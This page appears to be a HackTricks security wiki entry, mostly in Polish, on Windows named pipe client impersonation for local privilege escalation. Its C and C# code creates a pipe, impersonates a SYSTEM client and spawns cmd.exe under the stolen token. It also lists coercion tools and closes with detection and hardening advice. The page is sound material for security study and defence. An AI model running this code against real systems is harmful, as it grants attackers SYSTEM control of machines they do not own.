# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation jest lokalnym prymitywem eskalacji uprawnień, który pozwala wątkowi serwera named-pipe przyjąć kontekst bezpieczeństwa klienta, który się z nim łączy. W praktyce atakujący, który może uruchamiać kod z uprawnieniem SeImpersonatePrivilege, może zmusić uprzywilejowanego klienta (np. usługę uruchomioną jako SYSTEM) do połączenia się z rurą kontrolowaną przez atakującego, wywołać ImpersonateNamedPipeClient, zduplikować otrzymany token do tokenu pierwotnego i uruchomić proces jako ten klient (często NT AUTHORITY\SYSTEM).

Ta strona skupia się na podstawowej technice. Dla end-to-end exploit chains, które zmuszają SYSTEM do połączenia z twoją pipe, zobacz strony z rodziny Potato wymienione poniżej.

## TL;DR
- Utwórz named pipe: \\.\pipe\<random> i czekaj na połączenie.
- Zmusić uprzywilejowany komponent do połączenia się z nią (spooler/DCOM/EFSRPC/etc.).
- Odczytaj przynajmniej jedną wiadomość z pipe, potem wywołaj ImpersonateNamedPipeClient.
- Otwórz token impersonacji z bieżącego wątku, DuplicateTokenEx(TokenPrimary) i użyj CreateProcessWithTokenW/CreateProcessAsUser, aby uzyskać proces SYSTEM.

## Requirements and key APIs
- Uprawnienia zwykle potrzebne procesowi/wątkowi wywołującemu:
- SeImpersonatePrivilege do skutecznego impersonowania łączącego się klienta oraz do użycia CreateProcessWithTokenW.
- Alternatywnie, po impersonowaniu SYSTEM możesz użyć CreateProcessAsUser, co może wymagać SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (są one spełnione, gdy impersonujesz SYSTEM).
- Główne używane API:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (należy odczytać co najmniej jedną wiadomość przed impersonacją)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Poziom impersonacji: aby wykonać użyteczne akcje lokalnie, klient musi zezwolić na SecurityImpersonation (domyślnie dla wielu lokalnych RPC/named-pipe klientów). Klienci mogą obniżyć to ustawienie przy użyciu SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION podczas otwierania pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Uwagi:
- Jeśli ImpersonateNamedPipeClient zwraca ERROR_CANNOT_IMPERSONATE (1368), upewnij się, że najpierw odczytałeś z pipe i że klient nie ograniczył impersonation do Identification level.
- Preferuj DuplicateTokenEx z SecurityImpersonation i TokenPrimary, aby utworzyć primary token odpowiedni do tworzenia procesu.

## .NET — szybki przykład
W .NET, NamedPipeServerStream może wykonać impersonation za pomocą RunAsClient. Po przeprowadzeniu impersonation zduplikuj thread token i utwórz proces.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
These techniques coerce privileged services to connect to your named pipe so you can impersonate them:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Troubleshooting and gotchas
- You must read at least one message from the pipe before calling ImpersonateNamedPipeClient; otherwise you’ll get ERROR_CANNOT_IMPERSONATE (1368).
- If the client connects with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, the server cannot fully impersonate; check the token’s impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requires SeImpersonatePrivilege on the caller. If that fails with ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser after you already impersonated SYSTEM.
- Ensure your pipe’s security descriptor allows the target service to connect if you harden it; by default, pipes under \\.\pipe are accessible according to the server’s DACL.

## Detection and hardening
- Monitor named pipe creation and connections. Sysmon Event IDs 17 (Pipe Created) and 18 (Pipe Connected) are useful to baseline legitimate pipe names and catch unusual, random-looking pipes preceding token-manipulation events.
- Look for sequences: process creates a pipe, a SYSTEM service connects, then the creating process spawns a child as SYSTEM.
- Reduce exposure by removing SeImpersonatePrivilege from nonessential service accounts and avoiding unnecessary service logons with high privileges.
- Defensive development: when connecting to untrusted named pipes, specify SECURITY_SQOS_PRESENT with SECURITY_IDENTIFICATION to prevent servers from fully impersonating the client unless necessary.

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
